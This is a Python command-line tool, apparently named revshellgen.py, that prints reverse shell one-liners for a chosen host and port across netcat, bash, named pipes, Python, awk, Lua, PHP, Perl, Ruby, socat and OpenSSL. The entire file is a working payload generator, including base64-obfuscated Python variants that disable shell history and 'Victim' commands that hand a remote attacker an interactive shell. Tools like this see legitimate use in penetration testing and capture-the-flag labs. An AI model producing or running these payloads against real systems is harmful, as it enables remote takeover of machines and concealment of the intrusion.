#!/usr/bin/env python3

import base64
import sys

from colorama import Fore, Style

if len(sys.argv) == 4:
    if sys.argv[3] == 'netcat':
        print(Style.BRIGHT + Fore.BLUE + 'nc -e /bin/bash {} {}\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'nc -c bash {} {}'.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'bash':
        print(Style.BRIGHT + Fore.BLUE + 'bash -i > /dev/tcp/{}/{} 0>&1 2>&1\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'bash -i > /dev/tcp/{}/{} 0<&1 2>&1\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'bash -i &> /dev/tcp/{}/{} 0>&1\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'bash -c \'bash -i &> /dev/tcp/{}/{} 0>&1\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'exec 69>&-; exec 69<>/dev/tcp/{}/{}; while read -r command; do $command >&69 2>&69; done <&69\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'exec bash -i < /dev/tcp/{}/{} >&0 2>&0\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'exec bash -i &> /dev/tcp/{}/{} <&1'.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'file':
        print(Style.BRIGHT + Fore.BLUE + 'rm -f /tmp/f 2>/dev/null; mknod /tmp/f p && nc {} {} < /tmp/f | bash -i &> /tmp/f\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'rm -f /tmp/f 2>/dev/null; mkfifo /tmp/f && nc {} {} < /tmp/f | bash -i &> /tmp/f\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'rm -f /tmp/f 2>/dev/null; mkfifo /tmp/f && telnet {} {} < /tmp/f | bash -i &> /tmp/f'.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'python':
        CODE1 = '''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("bash")'''.format(sys.argv[1], sys.argv[2])
        CODE2 = '''import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");p=subprocess.call(["bash","-i"])'''.format(sys.argv[1], sys.argv[2])
        print(Style.BRIGHT + Fore.BLUE + 'python -c \'' + CODE1 + '\'\n')
        print(Style.BRIGHT + Fore.BLUE + 'python -c \'' + CODE2 + '\'\n')
        print(Style.BRIGHT + Fore.BLUE + "python -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"\n".format(str(base64.b64encode(CODE1.encode("utf-8"))).split('\'')[1]))
        print(Style.BRIGHT + Fore.BLUE + "python -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"".format(str(base64.b64encode(CODE2.encode("utf-8"))).split('\'')[1]))
    elif sys.argv[3] == 'awk':
        print(Style.BRIGHT + Fore.BLUE + 'awk \'BEGIN {{ s = "/inet/tcp/0/{}/{}"; while (1) {{ printf "$ " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c) }} }}\''.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'lua':
        print(Style.BRIGHT + Fore.BLUE + 'lua -e "require(\'socket\'); require(\'os\'); t=socket.tcp(); t:connect(\'{}\',\'{}\'); os.execute(\'bash -i <&3 >&3 2>&3\');"'.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'php':
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});exec("bash -i <&3 >&3 2>&3");\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});shell_exec("bash -i <&3 >&3 2>&3");\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});`bash -i <&3 >&3 2>&3`;\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});system("bash -i <&3 >&3 2>&3");\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});passthru("bash -i <&3 >&3 2>&3");\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});popen("bash -i <&3 >&3 2>&3","r");\'\n'.format(sys.argv[1], sys.argv[2]))
        print(Style.BRIGHT + Fore.BLUE + 'php -r \'$sock=fsockopen("{}",{});$proc=proc_open("bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\''.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'perl':
        print(Style.BRIGHT + Fore.BLUE + 'perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");}};\''.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'ruby':
        print(Style.BRIGHT + Fore.BLUE + 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'socat':
        print('Server: ' + Style.BRIGHT + Fore.BLUE + 'socat file:$(tty),raw,echo=0 tcp-listen:{}'.format(sys.argv[2]))
        print(Style.RESET_ALL + 'Victim: ' + Style.BRIGHT + Fore.RED + 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{}:{}'.format(sys.argv[1], sys.argv[2]))
    elif sys.argv[3] == 'openssl':
        print('Generating keys for server: ' + Style.BRIGHT + Fore.BLUE + 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes')
        print(Style.RESET_ALL + 'Server: ' + Style.BRIGHT + Fore.BLUE + 'openssl s_server -quiet -key key.pem -cert cert.pem -port {}'.format(sys.argv[2]))
        print(Style.RESET_ALL + 'Victim: ' + Style.BRIGHT + Fore.RED + 'rm -f /tmp/s 2>/dev/null; mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {}:{} > /tmp/s; rm -f /tmp/s 2>/dev/null'.format(sys.argv[1], sys.argv[2]))
    else:
        print(Style.BRIGHT + Fore.RED + 'You chose invalid reverse shell type\nPossible types: netcat, bash, file, python, awk, lua, php, perl, ruby, socat, openssl')
else:
    print(Style.BRIGHT + Fore.RED + 'Usage: revshellgen.py <LHOST> <LPORT> <TYPE>\nPossible types: netcat, bash, file, python, awk, lua, php, perl, ruby, socat, openssl')
